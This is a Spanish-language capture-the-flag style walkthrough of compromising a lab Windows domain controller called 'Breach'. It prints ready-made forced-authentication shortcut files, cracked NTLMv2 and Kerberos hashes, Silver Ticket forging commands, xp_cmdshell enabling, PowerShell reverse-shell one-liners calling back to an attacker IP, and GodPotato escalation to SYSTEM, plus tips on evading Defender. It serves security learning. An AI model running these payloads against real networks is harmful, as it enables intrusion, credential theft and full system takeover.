# Máquina: Breach

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Active Directory, IIS, MSSQL, Kerberos, PrivEsc

---


![Pasted image 20260912231847.png](assets/Pasted%20image%2020260912231847.png)

The User flag for this Box is located in a non-standard directory, C:\share\transfer.

fase uno reconocimiento 

```
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.55.177 -oN escaneo
```

```
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-12 23:21:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.55.177:1433:
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|     DNS_Tree_Name: breach.vl
|_    Product_Version: 10.0.20348
| ms-sql-info:
|   10.129.55.177:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-09-12T23:21:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-12T23:13:35
|_Not valid after:  2056-09-12T23:13:35
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-12T23:21:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2026-09-11T23:10:47
|_Not valid after:  2027-03-13T23:10:47
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-12T23:21:28+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-09-12T23:21:29
|_  start_date: N/A
```

![Pasted image 20260912232500.png](assets/Pasted%20image%2020260912232500.png)

al mirar parese que estamos en un posible dc asi que al mirar tambien miramos que no esta 443 no no tiene web seguro esta filtrado o algo pero tambien miramos que mssql nos da el fqdn asi que lo agregamos a nuestro etc/hosts tambien con el mismo nxc lo pedomos hacer


![Pasted image 20260912233606.png](assets/Pasted%20image%2020260912233606.png)

```
nxc smb 10.129.55.177
```

![Pasted image 20260912234115.png](assets/Pasted%20image%2020260912234115.png)

antes de seguir enumerando agregamos al etc/hosts

![Pasted image 20260912235810.png](assets/Pasted%20image%2020260912235810.png)

al enumerar miramos  que como guest tenemos unos recursos compartidos

```
 nxc smb 10.129.55.177 -u 'guest' -p '' --shares
```

![Pasted image 20260913000454.png](assets/Pasted%20image%2020260913000454.png)

sabiendo esto nos conectamos a dicho recurso

```
smbclient //BREACHDC.breach.vl/share -U "guest%"
```


![Pasted image 20260913000858.png](assets/Pasted%20image%2020260913000858.png)

al enumerar en contramos esto 

![Pasted image 20260913001455.png](assets/Pasted%20image%2020260913001455.png)

y miramos que julia fue la ultima que estubo por aqui pero aun no tenemos su pass asi que sigamos lego de enumerar por un rato i pensar esiste una vul que se llama forced authentication via SMB lo podemos hacer porque tenemos read y write sobre share

documentasion: https://www.scip.ch/en/?labs.20220421

ya sabiendo esto creamos el archivo `.scf`

```
[Shell]
Command=2
IconFile=\\10.10.15.81\test.ico
[Taskbar]
Command=ToggleDesktop
```

![Pasted image 20260913005754.png](assets/Pasted%20image%2020260913005754.png)

nos conectamos por smb y lo subimos pero nota yo subi barios archivos para asi tener un marguen de provabilidad positiva

archivos:

Important.scf

```
cat << 'EOF' > Important.scf
[Shell]
Command=2
IconFile=\\10.10.15.81\test.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

Important-(icon).url

```
cat << 'EOF' > "Important-(icon).url"
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\10.10.15.81\test.ico
IconIndex=1
EOF
```

desktop.ini

```
cat << 'EOF' > desktop.ini
[.ShellClassInfo]
IconResource=\\10.10.15.81\test.ico,1
[ViewState]
Mode=
Vid=
FolderType=Generic
EOF
```

Autorun.inf

```
cat << 'EOF' > Autorun.inf
[AutoRun]
icon=\\10.10.15.81\test.ico
EOF
```

ya con esto nos conectamos y lo subimos todos

![Pasted image 20260913014731.png](assets/Pasted%20image%2020260913014731.png)

```
smbclient //BREACHDC.breach.vl/share -U "guest%"
smb: \> cd transfer
smb: \transfer\> recurse ON
smb: \transfer\> prompt OFF
smb: \transfer\> mput *
```

y capturamos un hash ntlmv2

![Pasted image 20260913014958.png](assets/Pasted%20image%2020260913014958.png)

```
Julia.Wong::BREACH:6b41280f80979a8f:35AB829599EA8B4AECF53BCC0A787B1C:0101000000000000800FADD02043DD018B0D54BCE93F12590000000002000800550047005400480001001E00570049004E002D0033005900300052004C0038004F003700300038004C0004003400570049004E002D0033005900300052004C0038004F003700300038004C002E0055004700540048002E004C004F00430041004C000300140055004700540048002E004C004F00430041004C000500140055004700540048002E004C004F00430041004C0007000800800FADD02043DD0106000400020000000800300030000000000000000100000000200000A46554B4A65313864B76CE223696DDED5456A012F1707E88FC524D9EC89A6D640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380031000000000000000000
```

en tonses prosedecom a romperlo con hascat asi que lo guardamos

```
echo 'Julia.Wong::BREACH:6b41280f80979a8f:35AB829599EA8B4AECF53BCC0A787B1C:0101000000000000800FADD02043DD018B0D54BCE93F12590000000002000800550047005400480001001E00570049004E002D0033005900300052004C0038004F003700300038004C0004003400570049004E002D0033005900300052004C0038004F003700300038004C002E0055004700540048002E004C004F00430041004C000300140055004700540048002E004C004F00430041004C000500140055004700540048002E004C004F00430041004C0007000800800FADD02043DD0106000400020000000800300030000000000000000100000000200000A46554B4A65313864B76CE223696DDED5456A012F1707E88FC524D9EC89A6D640A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380031000000000000000000' > julia.hash
```

con hascat tenemos el modo 5600 para estos hash NTLv2 asi que lo usamos

```
hashcat -m 5600 julia.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

y con esto tenemos las pass que es computer1

![Pasted image 20260913015709.png](assets/Pasted%20image%2020260913015709.png)

miramos que la pass funciona

![Pasted image 20260913020050.png](assets/Pasted%20image%2020260913020050.png)

ya con esto y el primer mensaje dela maquina al iniciarla sacamos user.txt

```
smbclient //BREACHDC.breach.vl/share -U "julia.wong%Computer1"
```

![Pasted image 20260913020743.png](assets/Pasted%20image%2020260913020743.png)

![Pasted image 20260913020831.png](assets/Pasted%20image%2020260913020831.png)

```user
55d33e52bc5fa7a687b9f0dcfa103dda
```


![Pasted image 20260913021617.png](assets/Pasted%20image%2020260913021617.png)

seguimos enumerando  descargamos la confi del ad 

```
bloodhound-ce-python -u 'julia.wong' -p 'Computer1' -d breach.vl -dc BREACHDC.breach.vl -ns 10.129.55.177 -c All --zip
```

![Pasted image 20260913030937.png](assets/Pasted%20image%2020260913030937.png)

el blood nos muestra esto

![Pasted image 20260913031614.png](assets/Pasted%20image%2020260913031614.png)

esta es la confi que uso para enumerar con el blood

```
MATCH p=(s)-[:MemberOf|GenericAll|GenericWrite|WriteOwner|WriteDacl|Owns|ForceChangePassword|AddMember|AdminTo|CanRDP|CanPSRemote|ExecuteDCOM|DCSync|ReadLAPSPassword|ReadGMSAPassword|SQLAdmin|WriteSPN|AddSelf|AllowedToDelegate|AllowedToAct|HasSession|LocalToComputer|SyncLAPSPassword|WriteAccountRestrictions|WriteGPLink|ManageCertificates|GetChanges|GetChangesAll|GetChangesInFilteredSet|AddKeyCredentialLink|DumpSMSAPassword|HasSIDHistory|AllExtendedRights|GPLink|HasTrustKeys|ManageCA|DCFor|SameForestTrust|SpoofSIDHistory|AbuseTGTDelegation|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6a|ADCSESC6b|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13*1..4]->(t)
WHERE (s:User OR s:Group OR s:Computer)
WITH p, NODES(p) AS nodes
WHERE NONE(n IN nodes WHERE 
  n.name CONTAINS "ENTERPRISE ADMINS" OR
  n.name CONTAINS "DOMAIN ADMINS" OR
  n.name CONTAINS "ADMINISTRATORS" OR
  n.name CONTAINS "ADMINISTRATOR@" OR
  n.name CONTAINS "KEY ADMINS@" OR
  n.name CONTAINS "ACCOUNT OPERATORS" OR
  n.name CONTAINS "ENTERPRISE READ-ONLY DOMAIN CONTROLLERS" OR
  n.name CONTAINS "READ-ONLY DOMAIN CONTROLLERS" OR
  n.name CONTAINS "SCHEMA ADMINS" OR
  n.name CONTAINS "DENIED RODC PASSWORD REPLICATION GROUP" OR
  n.name CONTAINS "RAS AND IAS SERVERS" OR
  n.name CONTAINS "SERVER OPERATORS" OR
  n.name CONTAINS "PRINT OPERATORS" OR
  n.name CONTAINS "GUEST@" OR
  n.name CONTAINS "GUESTS@" OR
  n.name CONTAINS "-519" OR
  n.name CONTAINS "-512" OR
  n.name CONTAINS "-500" OR
  n.name CONTAINS "-516" OR
  n.name CONTAINS "-526" OR
  n.name CONTAINS "-527" OR
  n.name CONTAINS "USERS@" OR
  n.name CONTAINS "KRBTGT@" OR
  n.name CONTAINS "EVERYONE@" OR
  n.name CONTAINS "GROUP POLICY CREATOR OWNERS@" OR
  n.name CONTAINS "EXCHANGE WINDOWS PERMISSIONS"
)
RETURN p
LIMIT 2000
```

pero luego de seguir enumerando miramos usuarios y cuanteas kerberoasteable y con spn

```
nxc ldap 10.129.55.177 -u julia.wong -p Computer1 --kerberoasting salida.txt
```

![Pasted image 20260913032228.png](assets/Pasted%20image%2020260913032228.png)

esto nos da la cuenta de svc_mssql y el hash Kerberoast se pueder ver el SPN completo:

```
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\svc_mssql*
```

para terminar de aseguraranos enumeramos el spn dela cuenta con nxc

```
nxc ldap 10.129.55.177 -u julia.wong -p Computer1 --query "(servicePrincipalName=*)" "servicePrincipalName"
```

![Pasted image 20260913032725.png](assets/Pasted%20image%2020260913032725.png)

pero para que sirve en este caso el spn:

El SPN (Service Principal Name) es como una "etiqueta" que le dice a Kerberos: **"este servicio específico, corriendo en este servidor específico, pertenece a esta cuenta"**.

Su propósito legítimo es permitir la **autenticación Kerberos entre servicios**, sin usar contraseñas repetidamente. Por ejemplo:

- Cuando una app en la empresa necesita conectarse a SQL Server usando autenticación de Windows (integrada), el cliente le pide al Domain Controller: _"dame un ticket para hablar con el servicio `MSSQLSvc/breachdc.breach.vl:1433`"_
- El DC busca qué cuenta tiene ese SPN registrado (en este caso, `svc_mssql`) y genera un ticket cifrado con el hash de la contraseña de esa cuenta
- El cliente le entrega ese ticket al servidor SQL, que lo descifra con su propia copia del hash y así confirma "sí, este cliente fue autorizado por el DC"

Es decir, en un entorno normal, esto le ahorra a los administradores tener que gestionar contraseñas separadas para cada servicio — todo se resuelve a través de Kerberos usando la cuenta de servicio (`svc_mssql`) como intermediaria de confianza.

## ¿Por qué es un problema de seguridad (Kerberoasting)?

Aquí está el detalle importante: **cualquier usuario autenticado del dominio** (como nosotros con `julia.wong`) puede pedirle al DC un ticket de servicio para CUALQUIER SPN registrado, sin necesitar permisos especiales.

Ese ticket viene cifrado con el **hash de la contraseña de la cuenta de servicio** (`svc_mssql` en este caso). El problema es que:

1. El atacante puede solicitar ese ticket libremente
2. Puede llevárselo offline
3. Puede intentar **crackear el hash** con fuerza bruta/diccionario, sin que el DC se entere ni bloquee el intento

Si la cuenta de servicio (`svc_mssql`) tiene una contraseña débil, el atacante termina con las credenciales en texto plano de esa cuenta — y muchas veces las cuentas de servicio tienen privilegios elevados (por necesitar acceso a bases de datos, otros sistemas, etc.), lo que las vuelve un objetivo jugoso para escalar privilegios.

ya sabiendo esto prosedemos a romper el hash que el nxc nos dio para la cuenta svc

guardamos el hash para romperlo con el modo -m 13100 de hascat ya que este es un hash TGS de Kerberos

```
echo '$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl\\svc_mssql*$79401f5f1a108f7616111b62606291bc$e4c9fee727fbb427e145e23bb214bc022e2340a6ac5d112d2888f14b325c69e7ddea898338a215b440a343aaa630e0e5cf6ca745f5301d39f92c9e70d1844f3cba31e465158aa668b4222686d0b6c08b0eb6cefd88fa75b0d16389abc53a515c465b3ddf8b73bdbbd32475147327a58cec1b839ae29448d855da1f11ecee95d8d7280ac87d8d717a6e3d8f366876abc6e73ce28b323c72ce4262e6face06c2cc41cc2ef5d4a5d93259edae7f90aa763eb50ee91cd3bdf3ac51d5b95670c647079042606263fc0bd640b7ac8956fbffb1213266f4639ddc8d0057e28bad279291ff80f4ddf55dee118d2ec3c689eec2c1a3bf7f5e9e5542b801e5b11e3150dacbaa09c5476161ae747288969a5de6a11d5a7a3935115b4808abb528d928b027db1df6b0e80d2b53a73bf5cad393112b3e5d08c80860472a955059ced9185064c88910aaf0adad354307c7359d80c847ce1d305660dc5c4c18baaffaaa60e23759e3583af58b2ee0d283c0d9666413a8139fff7f5ddb6077f302afe5c5a2630dafeb48f22538ea8d8344183c66f7e4e85a38cb34b03b29dc64078f1ee4f1af10f65881aa76f85907e82d901dff81827e0244869c3b6f4b77250e004c455c4373fe6c2f2b655458f138724487f4294c599aeea3b465d34c452e41e9847bf8c1cc9219b541e6cc430b3e1144ef07ff799e853cec9a696d72eb64f003eacb2b2e135803ab1e6eb44c88e76c9620f273b75067cc77d129af907308ab519b63c12842f521be1a879e0add19cd3b2a970097c0a706e12d6db3791654202c319cfc45dc824a89faa7c8e1c4b44e2481bd824ba1fae6740a16bf94ce69d12ad0cbb554642b339b973241d2d62e56d813d91be0f37dd04e04d9e521a8770e7fb6b5c7adac4cf39c1760acd529fcc35de3301c40f9955d41001e69a0efc5003ba36f3df5df06a28caa1f3b7ef146d9191754a14f9ed7da9760660fe63f08611b4999fcb8778b213ea114d47b23144a4405446264fda6a5d7e0a6d8b6d73623c8e024e0444fb0cc8d0666f6ee3622b67c0b5f285212cff914cda29df19e19d6be27207635bfb16c2ae1dd5b159d04591304e938623c8de8267ed7ff576f195f21df302a231d3a07a975760943c7b98405f32149961c0fd473b4b83c5c8ac0644d52bd6a86c1a55b57e25bb96c64f2bc96a82e821297de35698ca91385ee7fe53649437fcbc94a169c0452aab70a1169295f05277b085fd596b391700bd7afbebf68ba65127e5653a50e2fadf4a0f1366bb90eded96c6b231fdadd88604d2a330e59f211ddbca9cb47c22f25a78e4919cf9ab32fc09012da1b6eadc8a0645ec51fc106e1ff76e720e454a536236b9bc8bc44e3ae0feea9b9de03924d5dd13ee5675a11d0f126ce90c2fb81a2e9584388c252b7ae51fa5bdf3d997f08b2d6a1203470cd031bb7249368ac700439678c48d11348465f46b4fd9048cb' > svc_mssql.hash
```

luego 

```
hashcat -m 13100 svc_mssql.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Pasted image 20260913034150.png](assets/Pasted%20image%2020260913034150.png)

la pass es: Trustno1

![Pasted image 20260913034209.png](assets/Pasted%20image%2020260913034209.png)

```
nxc smb 10.129.55.177 -u 'svc_mssql' -p 'Trustno1' --shares
```

![Pasted image 20260913034405.png](assets/Pasted%20image%2020260913034405.png)

la pass funciona asi que a enumerar con esta cuenta nos conectamos de una por mssql

```
mssqlclient.py breach.vl/svc_mssql:Trustno1@10.129.55.177 -windows-auth
```

![Pasted image 20260913040309.png](assets/Pasted%20image%2020260913040309.png)

miramos que la cuenta es como nuestro usuario tambien tiene abseso pero con privilegios vajos a mssql pero podemos hacer un Silver Ticket attack este tiket nos podemos hacer pasar por este usario

![Pasted image 20260913151245.png](assets/Pasted%20image%2020260913151245.png)

sabiendo esta sacamos el sid del dominio

```
lookupsid.py breach.vl/julia.wong:Computer1@10.129.56.36
```

![Pasted image 20260914010459.png](assets/Pasted%20image%2020260914010459.png)

el sigueinte paso es el el hash NT de `svc_mssql` Ya tenemos la contraseña en texto plano (`Trustno1`). Ahora necesitas convertirla al hash NT (NTLM) para poder falsificar el ticket.

esto lo pedos calcular con el mismo pipx

```
pipx run --spec pycryptodome python3 -c "
from Crypto.Hash import MD4
h = MD4.new()
h.update('Trustno1'.encode('utf-16le'))
print(h.hexdigest())
"
```

![Pasted image 20260914011047.png](assets/Pasted%20image%2020260914011047.png)

### Ya tenes los 3 ingredientes para el Silver Ticket

1. **SID del dominio**: `S-1-5-21-2330692793-3312915120-706255856`
2. **Hash NT de svc_mssql**: `69596c7aa1e8daee17f8e78870e25a5c`
3. **SPN**: `MSSQLSvc/breachdc.breach.vl:1433`

asi que con el ticketer.py pedimos el tiket

```
ticketer.py -nthash 69596c7aa1e8daee17f8e78870e25a5c -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn MSSQLSvc/breachdc.breach.vl:1433 Christine.Bruce
```

![Pasted image 20260914011434.png](assets/Pasted%20image%2020260914011434.png)

luego exportamos el tiket y nos conectamos como christine a mssql

```
export KRB5CCNAME=Christine.Bruce.ccache
```

```
mssqlclient.py -k breach.vl/Christine.Bruce@breachdc.breach.vl -no-pass
```

![Pasted image 20260914011709.png](assets/Pasted%20image%2020260914011709.png)

aora si activamos el xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1
```

```
RECONFIGURE
```

```
EXEC sp_configure 'xp_cmdshell', 1
```

```
RECONFIGURE
```

![Pasted image 20260914012345.png](assets/Pasted%20image%2020260914012345.png)

luego  de enumerar miramos que la  version del sistema 

```
xp_cmdshell systeminfo
```

![Pasted image 20260914013151.png](assets/Pasted%20image%2020260914013151.png)

luego miramos que privilejios tenemos y miramos lo siguiente

```
 xp_cmdshell whoami /priv
```

![Pasted image 20260914013822.png](assets/Pasted%20image%2020260914013822.png)

## que es esto?

Este privilegio le permite a un proceso "hacerse pasar por" (impersonar) el contexto de seguridad de otro usuario que se autentica ante él — es precisamente el privilegio que abusan los ataques tipo **Potato** (GodPotato, JuicyPotato, PrintSpoofer, etc.) para escalar de una cuenta de servicio como `svc_mssql` hasta **SYSTEM**.

Es un privilegio que normalmente se le da a cuentas de servicio (como las de IIS, MSSQL, etc.) porque legítimamente necesitan poder actuar en nombre de los usuarios que se conectan a ellas — pero mal configurado, se convierte en una ruta directa de escalada de privilegios.

https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeImpersonatePrivilege.md

vamos con el abuso

creamos un archivo ofuscado para que el firewall nolo detecte

```
cat << 'EOF' > shell2.ps1
$c = New-Object System.Net.Sockets.TCPClient('10.10.15.81',53);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex ". { $data } 2>&1" | Out-String ); $sb2 = $sb + '#';$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()
EOF
```

y luego lebantamos un nc porel puerto 53

```
sudo nc -nlvp 53
```

luego lo descargamos y ejecutamos

```
xp_cmdshell powershell -c "Invoke-WebRequest -Uri http://10.10.15.81:8080/shell2.ps1 -OutFile C:\Windows\Temp\shell2.ps1"
```

```
xp_cmdshell powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\shell2.ps1
```

![Pasted image 20260914015813.png](assets/Pasted%20image%2020260914015813.png)


a ora agamos el abuso potato

lo descargamos en nuestro arch

```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
```

luego en nuestra sesion con nc lo descargamos

```
Invoke-WebRequest -Uri http://10.10.15.81:8080/GodPotato-NET4.exe -OutFile C:\Windows\Temp\GodPotato-NET4.exe
```

![Pasted image 20260914020429.png](assets/Pasted%20image%2020260914020429.png)

luego ejecutamos

```
C:\Windows\Temp\GodPotato-NET4.exe -cmd "whoami"
```

![Pasted image 20260914020528.png](assets/Pasted%20image%2020260914020528.png)

nos pasamos es shell con el gou potato para mas control 

creamos el archivo

```
$c = New-Object System.Net.Sockets.TCPClient('10.10.15.81',4445);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex ". { $data } 2>&1" | Out-String ); $sb2 = $sb + '#';$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()
```

luego lo descargamos

```
Invoke-WebRequest -Uri http://10.10.15.81:8080/shell3.ps1 -OutFile C:\Windows\Temp\shell3.ps1
```

y luego ejecutamos

```
C:\Windows\Temp\GodPotato-NET4.exe -cmd "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\shell3.ps1"
```

![Pasted image 20260914021240.png](assets/Pasted%20image%2020260914021240.png)

y sacamos root.txt

![Pasted image 20260914021411.png](assets/Pasted%20image%2020260914021411.png)

```root
fc98f418f94f8cdb9a30ef026fe64345
```

### Resumen de la cadena de ataque

**1. Enumeración inicial (Nmap)**

- Identificamos que era un Domain Controller (puertos 88, 389, 445, etc.)
- Descubriste MSSQL en el puerto 1433

**2. Enumeración SMB con `guest`**

- La cuenta `guest` estaba habilitada y tenía escritura en el share `share`
- Encontraste nombres de usuarios y notaste actividad reciente de `julia.wong`

**3. Robo de hash NTLMv2 (Forced Authentication)**

- Aprendimo la técnica de archivos `.scf`/`.url` que fuerzan autenticación al abrir una carpeta
- Usamos **Responder** para capturar el hash cuando `julia.wong` navegó el share
- Crackeamos el hash con **hashcat** → contraseña de `julia.wong`

**4. Kerberoasting**

- Con las credenciales de `julia.wong`, identificamos que `svc_mssql` tenía un SPN (kerberoasteable)
- Solicitamos su TGS y lo crackeaste con hashcat → contraseña de `svc_mssql`

**5. Silver Ticket Attack**

- Con el hash NT de `svc_mssql`, falsificamos un ticket para impersonar a `Christine.Bruce` (Domain Admin)
- Esto nos dio privilegios de `sysadmin` en MSSQL

**6. Ejecución de comandos (`xp_cmdshell`)**

- Habilitamos  `xp_cmdshell` para ejecutar comandos del sistema operativo

**7. Reverse Shell + Evasión de Defender**

- Aprendinos que cambiar nombres de variables y puertos "normales" (como 53) ayuda a evadir detección

**8. Escalada a SYSTEM (GodPotato)**

- `svc_mssql` tenía `SeImpersonatePrivilege`
- Usamso **GodPotato** para abusar de ese privilegio y obtener una shell como `NT AUTHORITY\SYSTEM`

---

###  Conceptos clave para recordar

- **AD enumeration** siempre empieza por servicios anónimos/guest antes de ir a fuerza bruta
- **Forced authentication attacks** son poderosos cuando tienes escritura en shares
- **Kerberoasting** abusa de una función legítima de Kerberos
- **Silver Tickets** requieren el hash de la cuenta de servicio, no del DC completo
- **Potato attacks** dependen de `SeImpersonatePrivilege`, muy común en cuentas de servicio


![Pasted image 20260914022713.png](assets/Pasted%20image%2020260914022713.png)

